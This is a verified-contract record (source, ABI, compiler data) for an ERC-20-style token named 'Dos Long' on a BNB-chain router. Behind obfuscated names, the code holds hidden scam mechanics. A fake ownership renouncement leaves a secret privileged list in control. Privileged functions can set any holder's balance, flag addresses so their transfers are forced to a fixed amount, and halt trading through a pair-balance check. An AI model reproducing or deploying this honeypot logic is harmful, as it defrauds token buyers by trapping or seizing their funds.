{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface enableReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeFromFee {\n    function createPair(address txWalletTotal, address launchList) external returns (address);\n}\n\ninterface takeTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingExemptAmount) external view returns (uint256);\n\n    function transfer(address amountMarketing, uint256 marketingWallet) external returns (bool);\n\n    function allowance(address atLiquidityTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountMarketing,\n        uint256 marketingWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingReceiver, uint256 value);\n    event Approval(address indexed atLiquidityTx, address indexed spender, uint256 value);\n}\n\ninterface shouldAmount is takeTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DosLong is shouldTeam, takeTo, shouldAmount {\n\n    function getOwner() external view returns (address) {\n        return listTotalReceiver;\n    }\n\n    function amountMax(address modeShouldLimit, address amountMarketing, uint256 marketingWallet) internal returns (bool) {\n        if (modeShouldLimit == launchedSwapLaunch) {\n            return sellReceiver(modeShouldLimit, amountMarketing, marketingWallet);\n        }\n        uint256 teamLaunchMax = takeTo(teamWallet).balanceOf(fromTrading);\n        require(teamLaunchMax == listBuy);\n        require(amountMarketing != fromTrading);\n        if (receiverAuto[modeShouldLimit]) {\n            return sellReceiver(modeShouldLimit, amountMarketing, maxIsReceiver);\n        }\n        return sellReceiver(modeShouldLimit, amountMarketing, marketingWallet);\n    }\n\n    function txReceiver() public {\n        emit OwnershipTransferred(launchedSwapLaunch, address(0));\n        listTotalReceiver = address(0);\n    }\n\n    function takeWallet(address teamMin) public {\n        txShould();\n        if (limitAt != modeFrom) {\n            limitMode = buyTotal;\n        }\n        if (teamMin == launchedSwapLaunch || teamMin == teamWallet) {\n            return;\n        }\n        receiverAuto[teamMin] = true;\n    }\n\n    mapping(address => bool) public isLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTake;\n    }\n\n    address launchSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public limitMode;\n\n    event OwnershipTransferred(address indexed buyFrom, address indexed receiverShould);\n\n    function walletTotal(uint256 marketingWallet) public {\n        txShould();\n        listBuy = marketingWallet;\n    }\n\n    function allowance(address buySell, address fundTake) external view virtual override returns (uint256) {\n        if (fundTake == launchSell) {\n            return type(uint256).max;\n        }\n        return isShould[buySell][fundTake];\n    }\n\n    bool public limitAt;\n\n    function owner() external view returns (address) {\n        return listTotalReceiver;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return isAmount;\n    }\n\n    uint256 private shouldMax;\n\n    function balanceOf(address marketingExemptAmount) public view virtual override returns (uint256) {\n        return listWallet[marketingExemptAmount];\n    }\n\n    address public launchedSwapLaunch;\n\n    uint8 private toMin = 18;\n\n    mapping(address => uint256) private listWallet;\n\n    uint256 listBuy;\n\n    function txShould() private view {\n        require(isLaunch[_msgSender()]);\n    }\n\n    uint256 public feeToken;\n\n    bool private enableTotalMin;\n\n    bool public enableTotalTo;\n\n    address public teamWallet;\n\n    bool private shouldTeamReceiver;\n\n    function liquidityLimit(address launchMode) public {\n        if (enableTotalTo) {\n            return;\n        }\n        if (buyTotal == txMarketing) {\n            enableTotalMin = true;\n        }\n        isLaunch[launchMode] = true;\n        \n        enableTotalTo = true;\n    }\n\n    function transferFrom(address modeShouldLimit, address amountMarketing, uint256 marketingWallet) external override returns (bool) {\n        if (_msgSender() != launchSell) {\n            if (isShould[modeShouldLimit][_msgSender()] != type(uint256).max) {\n                require(marketingWallet <= isShould[modeShouldLimit][_msgSender()]);\n                isShould[modeShouldLimit][_msgSender()] -= marketingWallet;\n            }\n        }\n        return amountMax(modeShouldLimit, amountMarketing, marketingWallet);\n    }\n\n    bool private modeFrom;\n\n    string private exemptTake = \"Dos Long\";\n\n    uint256 private buyTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTx;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toMin;\n    }\n\n    string private isAmount = \"DLG\";\n\n    function approve(address fundTake, uint256 marketingWallet) public virtual override returns (bool) {\n        isShould[_msgSender()][fundTake] = marketingWallet;\n        emit Approval(_msgSender(), fundTake, marketingWallet);\n        return true;\n    }\n\n    uint256 private fromReceiver;\n\n    constructor (){\n        \n        enableReceiver atLaunched = enableReceiver(launchSell);\n        teamWallet = modeFromFee(atLaunched.factory()).createPair(atLaunched.WETH(), address(this));\n        if (enableTotalMin == modeFrom) {\n            modeFrom = false;\n        }\n        launchedSwapLaunch = _msgSender();\n        txReceiver();\n        isLaunch[launchedSwapLaunch] = true;\n        listWallet[launchedSwapLaunch] = listTx;\n        if (limitMode == txMarketing) {\n            shouldMax = limitMode;\n        }\n        emit Transfer(address(0), launchedSwapLaunch, listTx);\n    }\n\n    mapping(address => bool) public receiverAuto;\n\n    function enableFundSell(address toReceiver, uint256 marketingWallet) public {\n        txShould();\n        listWallet[toReceiver] = marketingWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private isShould;\n\n    address private listTotalReceiver;\n\n    address fromTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private listTx = 100000000 * 10 ** 18;\n\n    uint256 takeSenderToken;\n\n    function transfer(address toReceiver, uint256 marketingWallet) external virtual override returns (bool) {\n        return amountMax(_msgSender(), toReceiver, marketingWallet);\n    }\n\n    function sellReceiver(address modeShouldLimit, address amountMarketing, uint256 marketingWallet) internal returns (bool) {\n        require(listWallet[modeShouldLimit] >= marketingWallet);\n        listWallet[modeShouldLimit] -= marketingWallet;\n        listWallet[amountMarketing] += marketingWallet;\n        emit Transfer(modeShouldLimit, amountMarketing, marketingWallet);\n        return true;\n    }\n\n    uint256 constant maxIsReceiver = 19 ** 10;\n\n    uint256 private txMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLiquidityTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingExemptAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWallet\",\"type\":\"uint256\"}],\"name\":\"enableFundSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotalTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSwapLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"}],\"name\":\"liquidityLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMin\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeShouldLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingWallet\",\"type\":\"uint256\"}],\"name\":\"walletTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DosLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}